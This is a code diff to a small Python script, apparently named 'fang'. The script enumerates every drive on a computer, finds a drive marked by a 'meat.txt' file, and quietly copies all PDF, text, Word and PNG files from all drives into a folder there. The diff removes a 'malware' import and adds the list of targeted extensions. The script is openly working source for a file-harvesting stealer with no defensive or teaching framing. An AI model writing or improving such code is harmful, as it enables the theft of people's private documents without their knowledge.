@@ -1,9 +1,17 @@
 import shutil
-from malware import *
 import os
 from itertools import chain
 from string import ascii_uppercase
 
+#this list contians all the extensions that fang takes.
+
+ex_list = [".PDF",
+           "pdf",
+           ".txt",
+           ".doc",
+           ".docx",
+           ".png"
+           ]
 
 # this function returns all of the drivers the computer has.
 def get_drivers():
@@ -18,7 +26,7 @@ def get_drivers():
 def check(list):
     global the_place
     for driver in list:
-        if os.path.exists(driver + 'meat.txt'):
+        if os.path.exists(driver + 'meat.txt'):#I need to change the "meat.txt" to the place that the software stores at
             the_place = driver
     return the_place
 
@@ -37,7 +45,7 @@ for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for drive
     for file in filenames:
         if any(file.endswith(extension) for extension in ex_list):
             try:
-                shutil.copy(os.path.join(dirpath, file), des)
+                shutil.copy(os.path.join(dirpath, file), des+"the_beef")
             except PermissionError:
                 pass
             except FileNotFoundError:
